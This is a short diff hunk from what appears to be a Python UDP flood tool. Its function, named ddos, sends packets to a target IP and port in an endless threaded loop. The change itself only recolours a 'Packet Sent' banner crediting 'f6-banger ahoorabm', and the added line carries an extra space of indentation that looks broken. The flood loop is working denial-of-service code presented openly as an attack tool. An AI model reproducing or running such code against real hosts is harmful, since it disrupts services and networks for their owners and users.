@@ -19,7 +19,7 @@ def ddos(i):
     while 1:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
-        print("Packet Sent / f6-banger ahoorabm")
+         print(red+"Packet Sent // f6-banger ahoorabm"+red)
         print (" "+yellow)
 for i in range(int(thread_count)):
     try:
